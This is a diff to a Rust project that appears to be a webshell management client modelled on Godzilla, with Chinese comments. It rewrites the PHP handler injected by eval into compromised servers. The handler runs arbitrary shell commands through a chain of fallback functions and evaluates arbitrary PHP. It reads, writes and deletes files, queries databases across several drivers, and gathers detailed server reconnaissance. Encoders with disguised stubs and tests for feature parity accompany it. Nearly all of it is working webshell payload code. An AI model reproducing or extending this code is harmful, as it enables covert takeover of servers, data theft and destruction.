@@ -1596,155 +1596,113 @@ pub fn session_php_stub(
 
 /// 处理器代码：一次传输后驻留服务端 session，定义 run($p) 处理全部操作。
 /// 参数 JSON：{a: 操作名, n: nonce, ...}；返回 nonce 帧包裹的 JSON。
+///
+/// **版本前提**：处理器每次连接由客户端注入（`ensure_session_init`），所以它永远与
+/// 客户端同版本 —— 通道能力（6 驱动数据库、命令降级链、gzip）不受目标上已部署
+/// stub 版本影响。这正是本函数可以安全复用 [`crate::php_impl`] 片段的原因。
+///
+/// **gzip 在明文层**（`{"n":..,"z":1,"d":base64(gzip(内层 JSON))}`），与 NATIVE 的
+/// 密文层 gzip 不同：密文是高频熵数据，压缩收益接近零；明文层能真正压缩
+/// base64 载荷（上传/下载的分块，base64 膨胀 33% 可被收回）。响应同样在帧内
+/// base64 **之前**压缩，客户端按 gzip 魔数识别。
+static SESSION_HANDLER: std::sync::LazyLock<String> =
+    std::sync::LazyLock::new(build_session_handler);
+
 pub fn session_handler_code() -> &'static str {
-    // 注意：处理器经 eval 执行，不能包含 `<?php` 开标签
-    r#"// DswSesInit
-function run($p) {
-    $req = @json_decode($p, true);
-    if (!is_array($req)) { return $n . base64_encode('{"ok":false,"error":"bad params"}') . $n; }
-    $a = isset($req['a']) ? (string)$req['a'] : '';
-    $n = isset($req['n']) ? (string)$req['n'] : 'abababab';
-    $r = array('ok' => true, 'data' => array());
-    if ($a === 'probe') {
-        $r['data'] = array(
-            'server' => php_uname('s') . ' ' . php_uname('r') . ' ' . php_uname('m'),
-            'web_server' => @$_SERVER['SERVER_SOFTWARE'],
-            'php_version' => PHP_VERSION,
-            'current_dir' => getcwd(),
-            'separator' => DIRECTORY_SEPARATOR,
-            'info' => array('ChunkedTransfer' => '1', 'ProtoVersion' => '2', 'Capabilities' => 'chunked,stream,db,plugin,exec', 'ShellType' => 'file'),
-        );
-    } elseif ($a === 'exec') {
-        $c = isset($req['c']) ? (string)$req['c'] : '';
-        $o = @shell_exec($c . ' 2>&1');
-        $r['data'] = array('stdout' => base64_encode((string)$o), 'cwd' => getcwd());
-    } elseif ($a === 'eval') {
-        $c = isset($req['c']) ? (string)$req['c'] : '';
-        if ($c !== '') {
-            ob_start();
-            try {
-                @eval($c);
-                $r['data'] = (string)ob_get_clean();
-            } catch (Exception $e) {
-                $r['data'] = (string)ob_get_clean();
-                $r['ok'] = false;
-                $r['error'] = $e->getMessage();
-            } catch (Throwable $t) {
-                $r['data'] = (string)ob_get_clean();
-                $r['ok'] = false;
-                $r['error'] = $t->getMessage();
-            }
-        }
-    } elseif ($a === 'list') {
-        $d = isset($req['p']) ? (string)$req['p'] : '.';
-        $items = @scandir($d);
-        if ($items === false) { return $n . base64_encode('{"ok":false,"error":"read dir failed"}') . $n; }
-        $out = array();
-        foreach ($items as $f) {
-            if ($f === '.' || $f === '..') continue;
-            $full = rtrim($d, '/\\') . DIRECTORY_SEPARATOR . $f;
-            $is_dir = is_dir($full);
-            $out[] = array('name' => $f, 'path' => $full, 'is_dir' => $is_dir,
-                'size' => $is_dir ? 0 : filesize($full), 'mtime' => filemtime($full), 'perms' => @substr(sprintf('%o', @fileperms($full)), -3));
-        }
-        $r['data'] = array('entries' => $out);
-    } elseif ($a === 'read') {
-        $f = isset($req['p']) ? (string)$req['p'] : '';
-        $o = isset($req['o']) ? (int)$req['o'] : 0;
-        $l = isset($req['l']) ? (int)$req['l'] : 0;
-        $c = @file_get_contents($f, false, null, $o, $l > 0 ? $l : null);
-        if ($c === false) { return $n . base64_encode('{"ok":false,"error":"read failed"}') . $n; }
-        $r['data'] = base64_encode($c);
-    } elseif ($a === 'write') {
-        $f = isset($req['p']) ? (string)$req['p'] : '';
-        $o = isset($req['o']) ? (int)$req['o'] : 0;
-        $d = isset($req['d']) ? @base64_decode((string)$req['d']) : '';
-        $ok = $o > 0 ? @file_put_contents($f, $d, FILE_APPEND) : @file_put_contents($f, $d);
-        if ($ok === false) { return $n . base64_encode('{"ok":false,"error":"write failed"}') . $n; }
-    } elseif ($a === 'delete') {
-        $f = isset($req['p']) ? (string)$req['p'] : '';
-        if (is_dir($f)) { $ok = @rmdir($f); } else { $ok = @unlink($f); }
-        if (!$ok) { return $n . base64_encode('{"ok":false,"error":"delete failed"}') . $n; }
-    } elseif ($a === 'rename') {
-        $f = isset($req['f']) ? (string)$req['f'] : '';
-        $t = isset($req['t']) ? (string)$req['t'] : '';
-        if (!@rename($f, $t)) { return $n . base64_encode('{"ok":false,"error":"rename failed"}') . $n; }
-    } elseif ($a === 'mkdir') {
-        $d = isset($req['p']) ? (string)$req['p'] : '';
-        if (!@mkdir($d, 0755, true)) { return $n . base64_encode('{"ok":false,"error":"mkdir failed"}') . $n; }
-    } elseif ($a === 'touch') {
-        $d = isset($req['p']) ? (string)$req['p'] : '';
-        $t = isset($req['t']) ? (int)$req['t'] : time();
-        if (!@touch($d, $t)) { return $n . base64_encode('{"ok":false,"error":"touch failed"}') . $n; }
-    } elseif ($a === 'dbprobe') {
-        $c = isset($req['c']) ? (string)$req['c'] : '';
-        $out = @call_user_func('session_db_probe', $c);
-        $r['data'] = $out;
-    } elseif ($a === 'dbquery') {
-        $c = isset($req['c']) ? (string)$req['c'] : '';
-        $q = isset($req['q']) ? (string)$req['q'] : '';
-        $out = @call_user_func('session_db_query', $c, $q);
-        $r['data'] = $out;
-    }
-    return $n . base64_encode(json_encode($r)) . $n;
+    &SESSION_HANDLER
 }
-if (!function_exists('session_db_probe')) {
-    function session_db_probe($c) {
-        $p = @json_decode($c, true);
-        if (!is_array($p)) { return array('driver' => '', 'databases' => array(), 'message' => 'bad conn'); }
-        $driver = isset($p['driver']) ? (string)$p['driver'] : '';
-        $host = isset($p['host']) ? (string)$p['host'] : '';
-        $port = isset($p['port']) ? (int)$p['port'] : 3306;
-        $user = isset($p['username']) ? (string)$p['username'] : '';
-        $pass = isset($p['password']) ? (string)$p['password'] : '';
-        $db = isset($p['dbname']) ? (string)$p['dbname'] : '';
-        if (!class_exists('PDO')) { return array('driver' => $driver, 'databases' => array(), 'message' => 'no pdo'); }
-        try {
-            $dsn = $driver === 'pgsql' ? ('pgsql:host=' . $host . ';port=' . $port . ';dbname=' . ($db !== '' ? $db : 'postgres'))
-                 : ($driver === 'sqlite' ? ('sqlite:' . $db) : ('mysql:host=' . $host . ';port=' . $port . ';charset=utf8mb4'));
-            $dbh = new PDO($dsn, $user, $pass, array(PDO::ATTR_TIMEOUT => 5, PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
-            if ($driver === 'sqlite') { $dbs = array($db); }
-            elseif ($driver === 'pgsql') { $dbs = array(); foreach ($dbh->query('SELECT datname FROM pg_database') as $row) { $dbs[] = $row[0]; } }
-            else { $dbs = array(); foreach ($dbh->query('SHOW DATABASES') as $row) { $dbs[] = $row[0]; } }
-            return array('driver' => $driver, 'databases' => $dbs, 'message' => 'ok');
-        } catch (Exception $e) {
-            return array('driver' => $driver, 'databases' => array(), 'message' => $e->getMessage());
-        }
-    }
-    function session_db_query($c, $q) {
-        $p = @json_decode($c, true);
-        if (!is_array($p)) { return array('columns' => array(), 'rows' => array(), 'affected' => 0); }
-        $driver = isset($p['driver']) ? (string)$p['driver'] : '';
-        $host = isset($p['host']) ? (string)$p['host'] : '';
-        $port = isset($p['port']) ? (int)$p['port'] : 3306;
-        $user = isset($p['username']) ? (string)$p['username'] : '';
-        $pass = isset($p['password']) ? (string)$p['password'] : '';
-        $db = isset($p['dbname']) ? (string)$p['dbname'] : '';
-        if (!class_exists('PDO')) { return array('columns' => array(), 'rows' => array(), 'affected' => 0); }
-        try {
-            $dsn = $driver === 'pgsql' ? ('pgsql:host=' . $host . ';port=' . $port . ';dbname=' . ($db !== '' ? $db : 'postgres'))
-                 : ($driver === 'sqlite' ? ('sqlite:' . $db) : ('mysql:host=' . $host . ';port=' . $port . ';charset=utf8mb4' . ($db !== '' ? ';dbname=' . $db : '')));
-            $dbh = new PDO($dsn, $user, $pass, array(PDO::ATTR_TIMEOUT => 5, PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
-            $st = $dbh->query($q);
-            if ($st === false) { return array('columns' => array(), 'rows' => array(), 'affected' => 0); }
-            if (preg_match('/^\s*(select|show|desc|describe|explain|pragma|with)\b/i', $q)) {
-                $cols = array();
-                $nc = $st->columnCount();
-                for ($i = 0; $i < $nc; $i++) { $m = $st->getColumnMeta($i); $cols[] = (isset($m['name']) && $m['name'] !== '') ? $m['name'] : ('col' . $i); }
-                $rows = array(); $cnt = 0;
-                while (($row = $st->fetch(PDO::FETCH_NUM)) !== false && $cnt < 1000) {
-                    $cells = array(); foreach ($row as $v) { $cells[] = ($v === null) ? null : (string)$v; }
-                    $rows[] = $cells; $cnt++;
-                }
-                return array('columns' => $cols, 'rows' => $rows, 'affected' => 0);
-            }
-            return array('columns' => array(), 'rows' => array(), 'affected' => $st->rowCount());
-        } catch (Exception $e) {
-            return array('columns' => array(), 'rows' => array(), 'affected' => 0);
-        }
-    }
+
+fn build_session_handler() -> String {
+    use crate::php_impl;
+    // 处理器经 eval 执行，不能包含 `<?php` 开标签。
+    let mut code = String::from("// DswSesInit\n");
+    code.push_str(php_impl::PHP_REDIS_HELPERS);
+    code.push_str(
+        r#"function run($p) {
+$req=@json_decode($p,true);
+$n=is_array($req)&&isset($req['n'])?(string)$req['n']:'abababab';
+$gz=false;
+if(is_array($req)&&isset($req['z'])){
+$gz=true;
+$__in=@gzdecode(@base64_decode((string)$req['d']));
+$req=is_string($__in)?@json_decode($__in,true):null;
 }
-"#
+if(!is_array($req)){return $n.base64_encode('{"ok":false,"error":"bad params"}').$n;}
+$n=isset($req['n'])?(string)$req['n']:$n;
+$a=isset($req['a'])?(string)$req['a']:'';
+$r=array('ok'=>true,'data'=>array());
+if($a==='probe'){
+"#,
+    );
+    code.push_str(php_impl::PHP_INFO_IMPL);
+    code.push_str(
+        r#"$r['data']=array('server'=>$info['OsInfo'],'web_server'=>$info['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>@getcwd(),'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>$info['ProcessArch'],'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>$info['disable_functions'],'info'=>$info);
+}elseif($a==='exec'){
+$c=isset($req['c'])?(string)$req['c']:'';$w=isset($req['w'])?(string)$req['w']:'';
+"#,
+    );
+    code.push_str(php_impl::PHP_EXEC_IMPL);
+    code.push_str(
+        r#"if($ok){$r['data']=array('stdout'=>$stdout,'cwd'=>$cwd);}else{$r['ok']=false;$r['error']=$err;}
+}elseif($a==='eval'){
+$c=isset($req['c'])?(string)$req['c']:'';
+if($c===''){$r['ok']=false;$r['error']='empty';}
+else{
+ob_start();
+try{@eval($c);$r['data']=(string)ob_get_clean();}
+catch(Exception $__e){$r['data']=(string)ob_get_clean();$r['ok']=false;$r['error']=$__e->getMessage();}
+catch(Throwable $__t){$r['data']=(string)ob_get_clean();$r['ok']=false;$r['error']=$__t->getMessage();}
+}
+}elseif($a==='list'){
+$p=isset($req['p'])?(string)$req['p']:'.';
+"#,
+    );
+    code.push_str(php_impl::PHP_SCAN_IMPL);
+    code.push_str(
+        r#"if($ok){$r['data']=array('entries'=>$entries);}else{$r['ok']=false;$r['error']=$err;}
+}elseif($a==='read'){
+$f=isset($req['p'])?(string)$req['p']:'';$o=isset($req['o'])?(int)$req['o']:0;$l=isset($req['l'])?(int)$req['l']:0;
+$__c=@file_get_contents($f,false,null,$o,$l>0?$l:null);
+if($__c===false){$r['ok']=false;$r['error']='read failed';}else{$r['data']=base64_encode($__c);}
+}elseif($a==='write'){
+$f=isset($req['p'])?(string)$req['p']:'';$o=isset($req['o'])?(int)$req['o']:0;$d=isset($req['d'])?@base64_decode((string)$req['d']):'';
+$__w=$o>0?@file_put_contents($f,$d,FILE_APPEND):@file_put_contents($f,$d);
+if($__w===false){$r['ok']=false;$r['error']='write failed';}
+}elseif($a==='delete'){
+$f=isset($req['p'])?(string)$req['p']:'';
+$__d=@is_dir($f)?@rmdir($f):@unlink($f);
+if(!$__d){$r['ok']=false;$r['error']='delete failed';}
+}elseif($a==='rename'){
+$f=isset($req['f'])?(string)$req['f']:'';$t=isset($req['t'])?(string)$req['t']:'';
+if(!@rename($f,$t)){$r['ok']=false;$r['error']='rename failed';}
+}elseif($a==='mkdir'){
+$d=isset($req['p'])?(string)$req['p']:'';
+if(!@mkdir($d,0755,true)){$r['ok']=false;$r['error']='mkdir failed';}
+}elseif($a==='touch'){
+$d=isset($req['p'])?(string)$req['p']:'';$t=isset($req['t'])?(int)$req['t']:time();
+if(!@touch($d,$t)){$r['ok']=false;$r['error']='touch failed';}
+}elseif($a==='dbprobe'){
+$c=isset($req['c'])?(string)$req['c']:'';
+"#,
+    );
+    code.push_str(php_impl::PHP_DB_PROBE_IMPL);
+    code.push_str(
+        r#"if($ok){$r['data']=array('driver'=>$driver,'databases'=>$databases,'message'=>'ok');}else{$r['ok']=false;$r['error']=$err;}
+}elseif($a==='dbquery'){
+$c=isset($req['c'])?(string)$req['c']:'';$q=isset($req['q'])?(string)$req['q']:'';
+"#,
+    );
+    code.push_str(php_impl::PHP_DB_QUERY_IMPL);
+    code.push_str(
+        r#"if($ok){$r['data']=array('columns'=>$columns,'rows'=>$rows,'affected'=>$affected);}else{$r['ok']=false;$r['error']=$err;}
+}
+$__j=json_encode($r);
+if($gz&&strlen($__j)>512&&function_exists('gzencode')){$__j=@gzencode($__j,6);}
+return $n.base64_encode($__j).$n;
+}
+"#,
+    );
+    code
 }
 
 /// Godzilla 分阶段载荷编码器。
@@ -1864,15 +1822,15 @@ function __XOR__($d,$k){$o='';$n=strlen($d);for($i=0;$i<$n;$i++){$o.=$d[$i]^$k[$
 /* 数据加解密算法（自实现） */
 __ALGO__
 /* 业务处理函数 */
-function __CMD__($c,$w=''){if($w!==''&&is_dir($w))@chdir($w);global $_g;$o='';if(preg_match('/^\s*cd\s+(\S+)/',$c,$m)){@chdir($m[1]);}else{$o='';if($_g[0]===''){$o='';}elseif($_g[0]==='exec'){@exec($c.' 2>&1',$__l);$o=implode("\n",$__l);}elseif($_g[0]==='system'||$_g[0]==='passthru'){ob_start();@$_g[0]($c.' 2>&1');$o=ob_get_clean();}elseif($_g[0]==='popen'){$__p=@popen($c.' 2>&1','r');$o=$__p?stream_get_contents($__p):'';if($__p)@pclose($__p);}else{$o=@$_g[0]($c.' 2>&1');}$o=$_g[2]((string)$o);}$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('stdout'=>$o,'cwd'=>$d===false?'':$d)));}
-function __SCAN__($p){global $_g;$out=array();$items=@$_g[5]($p);if($items===false)return '{"ok":false,"error":"read dir failed"}';foreach($items as $f){if($f==='.'||$f==='..')continue;$full=rtrim($p,'/\\').DIRECTORY_SEPARATOR.$f;$isd=@$_g[6]($full);$out[]=array('name'=>$f,'path'=>$full,'is_dir'=>$isd,'size'=>$isd?0:@$_g[7]($full),'mtime'=>@$_g[8]($full),'perms'=>@substr(sprintf('%o',@fileperms($full)),-3));}return json_encode(array('ok'=>true,'data'=>array('entries'=>$out)));}
+function __CMD__($c,$w=''){if($w!==''&&is_dir($w))@chdir($w);global $_g;$o='';if(preg_match('/^\s*cd\s+(\S+)/',$c,$m)){@chdir($m[1]);}else{$o='';if($_g[0]===''){return '{"ok":false,"error":"no exec function available (shell_exec/exec/system/passthru/popen)"}';}elseif($_g[0]==='exec'){@exec($c.' 2>&1',$__l);$o=implode("\n",$__l);}elseif($_g[0]==='system'||$_g[0]==='passthru'){ob_start();@$_g[0]($c.' 2>&1');$o=ob_get_clean();}elseif($_g[0]==='popen'){$__p=@popen($c.' 2>&1','r');$o=$__p?stream_get_contents($__p):'';if($__p)@pclose($__p);}else{$o=@$_g[0]($c.' 2>&1');}$o=$_g[2]((string)$o);}$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('stdout'=>$o,'cwd'=>$d===false?'':$d)));}
+function __SCAN__($p){global $_g;$out=array();$items=@$_g[5]($p);if($items===false)return '{"ok":false,"error":"read dir failed"}';foreach($items as $f){if($f==='.'||$f==='..')continue;$full=rtrim($p,'/\\').DIRECTORY_SEPARATOR.$f;$s=@stat($full);$isd=($s!==false)&&(($s['mode']&0170000)===0040000);$out[]=array('name'=>$f,'path'=>$full,'is_dir'=>$isd,'size'=>($isd||$s===false)?0:$s['size'],'mtime'=>($s===false)?0:$s['mtime'],'perms'=>($s===false)?'':substr(sprintf('%o',$s['mode']&0777),-3));}return json_encode(array('ok'=>true,'data'=>array('entries'=>$out)));}
 function __FETCH__($p,$o=0,$l=0){global $_g;$c=@$_g[3]($p,false,null,(int)$o,(int)$l>0?(int)$l:null);if($c===false)return '{"ok":false,"error":"read failed"}';return json_encode(array('ok'=>true,'data'=>$_g[2]($c)));}
 function __STORE__($p,$d,$o=0){global $_g;$raw=@$_g[1]($d);if($raw===false)return '{"ok":false,"error":"write failed"}';$v=((int)$o>0)?@$_g[4]($p,$raw,FILE_APPEND):@$_g[4]($p,$raw);if($v===false)return '{"ok":false,"error":"write failed"}';return '{"ok":true,"data":null}';}
 function __DROP__($p){global $_g;$ok=@$_g[6]($p)?@$_g[10]($p):@$_g[9]($p);return $ok?'{"ok":true,"data":null}':'{"ok":false,"error":"delete failed"}';}
 function __MOVE__($f,$t){global $_g;return @$_g[11]($f,$t)?'{"ok":true,"data":null}':'{"ok":false,"error":"rename failed"}';}
 function __MKDIR__($p){global $_g;return @$_g[12]($p,0755,true)?'{"ok":true,"data":null}':'{"ok":false,"error":"mkdir failed"}';}
 function __TOUCH__($p,$t){return @touch($p,(int)$t)?'{"ok":true,"data":null}':'{"ok":false,"error":"touch failed"}';}
-function __ENV__(){global $_g;$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('server'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>$d===false?'':$d,'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>@$_g[14]('m'),'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>''.@ini_get('disable_functions'),'info'=>array('ChunkedTransfer'=>'1','ProtoVersion'=>'2','Capabilities'=>'chunked,stream,db,plugin,exec','ShellType'=>'file','OsInfo'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'CurrentUser'=>''.@get_current_user(),'REMOTE_ADDR'=>''.@$_SERVER['REMOTE_ADDR'],'REMOTE_PORT'=>''.@$_SERVER['REMOTE_PORT'],'HTTP_X_FORWARDED_FOR'=>''.@$_SERVER['HTTP_X_FORWARDED_FOR'],'HTTP_CLIENT_IP'=>''.@$_SERVER['HTTP_CLIENT_IP'],'SERVER_ADDR'=>''.@$_SERVER['SERVER_ADDR'],'SERVER_NAME'=>''.@$_SERVER['SERVER_NAME'],'SERVER_PORT'=>''.@$_SERVER['SERVER_PORT'],'disable_functions'=>''.@ini_get('disable_functions'),'Open_basedir'=>''.@ini_get('open_basedir'),'timezone'=>''.@date_default_timezone_get(),'encode'=>''.@ini_get('default_charset'),'extension_dir'=>''.@ini_get('extension_dir'),'Path'=>''.@getenv('PATH'),'PATHEXT'=>''.@getenv('PATHEXT'),'APPDATA'=>''.@getenv('APPDATA'),'systempdir'=>''.@sys_get_temp_dir().'/','include_path'=>''.@ini_get('include_path'),'DOCUMENT_ROOT'=>''.@$_SERVER['DOCUMENT_ROOT'],'PHP_SAPI'=>PHP_SAPI,'PHP_VERSION'=>PHP_VERSION,'PHP_INT_SIZE'=>PHP_INT_SIZE,'ProcessArch'=>(PHP_INT_SIZE===8?'x64':'x86'),'PHP_OS'=>PHP_OS,'canCallGzipDecode'=>function_exists('gzdecode')?1:0,'canCallGzipEncode'=>function_exists('gzencode')?1:0,'session_name'=>''.@session_name(),'session_save_path'=>''.@ini_get('session.save_path'),'session_save_handler'=>''.@ini_get('session.save_handler'),'session_serialize_handler'=>''.@ini_get('session.serialize_handler'),'user_ini_filename'=>''.@ini_get('user_ini.filename'),'memory_limit'=>''.@ini_get('memory_limit'),'upload_max_filesize'=>''.@ini_get('upload_max_filesize'),'post_max_size'=>''.@ini_get('post_max_size'),'max_execution_time'=>''.@ini_get('max_execution_time'),'max_input_time'=>''.@ini_get('max_input_time'),'default_socket_timeout'=>''.@ini_get('default_socket_timeout'),'mygid'=>function_exists('posix_getgid')?''.@posix_getgid():'','mypid'=>''.@getmypid(),'SERVER_SOFTWARE'=>''.@$_SERVER['SERVER_SOFTWARE'],'loaded_extensions'=>implode(',',@get_loaded_extensions()),'short_open_tag'=>''.@ini_get('short_open_tag'),'asp_tags'=>''.@ini_get('asp_tags'),'safe_mode'=>''.@ini_get('safe_mode'),'CurrentDir'=>$d===false?'':$d,'FileRoot'=>''.@$_SERVER['DOCUMENT_ROOT']))));}
+function __ENV__(){global $_g;$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('server'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>$d===false?'':$d,'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>@$_g[14]('m'),'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>''.@ini_get('disable_functions'),'info'=>array('ChunkedTransfer'=>'1','ProtoVersion'=>'2','Capabilities'=>'chunked,stream,db,plugin,exec,gzip','ShellType'=>'file','OsInfo'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'CurrentUser'=>''.@get_current_user(),'REMOTE_ADDR'=>''.@$_SERVER['REMOTE_ADDR'],'REMOTE_PORT'=>''.@$_SERVER['REMOTE_PORT'],'HTTP_X_FORWARDED_FOR'=>''.@$_SERVER['HTTP_X_FORWARDED_FOR'],'HTTP_CLIENT_IP'=>''.@$_SERVER['HTTP_CLIENT_IP'],'SERVER_ADDR'=>''.@$_SERVER['SERVER_ADDR'],'SERVER_NAME'=>''.@$_SERVER['SERVER_NAME'],'SERVER_PORT'=>''.@$_SERVER['SERVER_PORT'],'disable_functions'=>''.@ini_get('disable_functions'),'Open_basedir'=>''.@ini_get('open_basedir'),'timezone'=>''.@date_default_timezone_get(),'encode'=>''.@ini_get('default_charset'),'extension_dir'=>''.@ini_get('extension_dir'),'Path'=>''.@getenv('PATH'),'PATHEXT'=>''.@getenv('PATHEXT'),'APPDATA'=>''.@getenv('APPDATA'),'systempdir'=>''.@sys_get_temp_dir().'/','include_path'=>''.@ini_get('include_path'),'DOCUMENT_ROOT'=>''.@$_SERVER['DOCUMENT_ROOT'],'PHP_SAPI'=>PHP_SAPI,'PHP_VERSION'=>PHP_VERSION,'PHP_INT_SIZE'=>PHP_INT_SIZE,'ProcessArch'=>(PHP_INT_SIZE===8?'x64':'x86'),'PHP_OS'=>PHP_OS,'canCallGzipDecode'=>function_exists('gzdecode')?1:0,'canCallGzipEncode'=>function_exists('gzencode')?1:0,'session_name'=>''.@session_name(),'session_save_path'=>''.@ini_get('session.save_path'),'session_save_handler'=>''.@ini_get('session.save_handler'),'session_serialize_handler'=>''.@ini_get('session.serialize_handler'),'user_ini_filename'=>''.@ini_get('user_ini.filename'),'memory_limit'=>''.@ini_get('memory_limit'),'upload_max_filesize'=>''.@ini_get('upload_max_filesize'),'post_max_size'=>''.@ini_get('post_max_size'),'max_execution_time'=>''.@ini_get('max_execution_time'),'max_input_time'=>''.@ini_get('max_input_time'),'default_socket_timeout'=>''.@ini_get('default_socket_timeout'),'mygid'=>function_exists('posix_getgid')?''.@posix_getgid():'','mypid'=>''.@getmypid(),'SERVER_SOFTWARE'=>''.@$_SERVER['SERVER_SOFTWARE'],'loaded_extensions'=>implode(',',@get_loaded_extensions()),'short_open_tag'=>''.@ini_get('short_open_tag'),'asp_tags'=>''.@ini_get('asp_tags'),'safe_mode'=>''.@ini_get('safe_mode'),'CurrentDir'=>$d===false?'':$d,'FileRoot'=>''.@$_SERVER['DOCUMENT_ROOT']))));}
 function __EVALFN__($c){if($c==='')return '{"ok":false,"error":"empty"}';try{ob_start();@eval($c);$o=ob_get_clean();return json_encode(array('ok'=>true,'data'=>$o));}catch(Throwable $t){return json_encode(array('ok'=>false,'error'=>$t->getMessage()));}}
 function __DBP__($c){
 $p=@json_decode($c,true);if(!is_array($p))return '{"ok":false,"error":"bad conn"}';
@@ -2826,11 +2784,11 @@ mod tests {
         assert!(!handler.contains("<?php"), "处理器不应含 PHP 开标签");
         assert!(handler.contains("function run"), "处理器应定义 run");
         for action in [
-            "probe", "exec", "list", "read", "write", "delete", "rename", "mkdir", "dbprobe",
-            "dbquery",
+            "probe", "exec", "eval", "list", "read", "write", "delete", "rename", "mkdir", "touch",
+            "dbprobe", "dbquery",
         ] {
             assert!(
-                handler.contains(&format!("$a === '{action}'")),
+                handler.contains(&format!("$a==='{action}'")),
                 "处理器应含 {action} 分支"
             );
         }
@@ -2987,17 +2945,34 @@ mod tests {
         }
     }
 
-    /// 回归：分阶段处理器的错误分支也必须用 nonce 帧包裹，
+    /// 回归：分阶段处理器的**所有**返回路径都必须用 nonce 帧包裹，
     /// 否则客户端把 ServerError 误判为「响应中未找到协议帧」。
+    ///
+    /// 现设计把收尾收敛到函数末尾的单一 `return`：错误分支只写
+    /// `$r['ok']=false` / `$r['error']`，帧包裹天然覆盖全部分支；
+    /// 唯一的提前返回（请求 JSON 解析失败）自带帧。本测试守住这两点。
     #[test]
     fn session_handler_errors_are_nonce_framed() {
         let handler = session_handler_code();
+        // 唯一提前返回必须带帧，且 $n 在它之前就已取好（否则帧里是空 nonce）
+        assert_eq!(
+            handler.matches("base64_encode('{\"ok\":false").count(),
+            1,
+            "只应有一处内联错误帧（提前返回）"
+        );
+        assert!(
+            handler.contains(r#"return $n.base64_encode('{"ok":false,"error":"bad params"}').$n;"#),
+            "请求解析失败的提前返回必须带 nonce 帧"
+        );
+        // 收尾帧包裹整个 $r
+        assert!(
+            handler.contains("return $n.base64_encode($__j).$n;"),
+            "收尾必须帧包裹 $r"
+        );
         for message in ["read failed", "write failed", "mkdir failed"] {
             assert!(
-                handler.contains(&format!(
-                    "return $n . base64_encode('{{\"ok\":false,\"error\":\"{message}\"}}') . $n;"
-                )),
-                "处理器错误分支应带 nonce 帧：{message}"
+                handler.contains(&format!("$r['error']='{message}';")),
+                "错误分支应写入 $r：{message}"
             );
         }
         // NATIVE stub 的同类字符串是**载荷**（外层统一加帧），不得被误改
@@ -3005,8 +2980,130 @@ mod tests {
             .stub("php", "secret")
             .unwrap();
         assert!(
-            !native.contains("$n . base64_encode"),
+            !native.contains("$n.base64_encode"),
             "NATIVE stub 不应出现帧形式的 $n 拼接"
+        );
+    }
+
+    /// 通道对齐：分阶段处理器必须与 NATIVE stub 具备同一批能力
+    /// （6 驱动数据库、命令函数降级链、单次 stat 的目录列举）。
+    ///
+    /// 历史缺陷：处理器只支持 mysql/pgsql/sqlite 三个驱动、命令硬用 `shell_exec`、
+    /// 目录列举逐项 4 次系统调用 —— 同一个 Shell 换个编码器就少一半功能。
+    #[test]
+    fn session_handler_matches_native_capabilities() {
+        let handler = session_handler_code();
+        let native = NativeEncoder { crypto: "xor" }
+            .stub("php", "secret")
+            .unwrap();
+        for marker in [
+            "sqlsrv:Server=",
+            "dblib:host=",
+            "oci:dbname=",
+            "SELECT name FROM sys.databases",
+            "SELECT datname FROM pg_database",
+            "SELECT username FROM all_users",
+            "SHOW DATABASES",
+            "'shell_exec','exec','system','passthru','popen'",
+            "chunked,stream,db,plugin,exec,gzip",
+        ] {
+            assert!(handler.contains(marker), "处理器缺少：{marker}");
+            assert!(native.contains(marker), "NATIVE stub 缺少：{marker}");
+        }
+        // redis 走裸 RESP：NATIVE 经符号表调用，处理器用 dsw_rcmd
+        assert!(handler.contains("dsw_rcmd"), "处理器应含 redis RESP 辅助");
+        assert!(native.contains("AUTH"), "NATIVE stub 应含 redis AUTH");
+        // 目录列举：单次 stat，不再逐项 is_dir/filesize/filemtime/fileperms
+        assert!(
+            handler.contains("$__s=@stat($__full);"),
+            "处理器目录列举应合并 stat"
+        );
+        assert!(
+            native.contains("$s=@stat($full);"),
+            "NATIVE 目录列举应合并 stat"
+        );
+        assert!(
+            !handler.contains("fileperms("),
+            "处理器不应再逐项 fileperms"
+        );
+        assert!(
+            !native.contains("fileperms("),
+            "NATIVE stub 不应再逐项 fileperms"
+        );
+        // 命令函数全被禁用时给出明确错误，而不是静默空输出
+        assert!(
+            handler.contains("no exec function available"),
+            "处理器应报告无可用的命令执行函数"
+        );
+        assert!(
+            native.contains("no exec function available"),
+            "NATIVE stub 应报告无可用的命令执行函数"
+        );
+    }
+
+    /// 回归：业务伪装 stub / 请求体直传 stub 的 `$_g[0]` 是**调用方传入的第一个
+    /// 符号**（base64_decode / openssl_decrypt），不得被「执行器降级」覆盖成命令函数。
+    ///
+    /// 两处模板曾各带一段降级代码覆盖 `$_g[0]`，于是解包时去调用
+    /// `shell_exec(密文)` 并返回空，实测响应为 `{"code":200,"rule_size":0}`，
+    /// 客户端报「响应中未找到协议帧」—— 8 个 legacy 编码器全部不可用。
+    /// 命令函数降级链现在由发送的代码自行探测（`php_impl::PHP_EXEC_IMPL`）。
+    #[test]
+    fn legacy_stubs_do_not_clobber_symbol_slot_zero() {
+        let mut checked = 0;
+        for (id, _) in EncoderRegistry::global().list() {
+            // custom 的 stub 由用户上传，本仓库不产出
+            if id == "custom" {
+                continue;
+            }
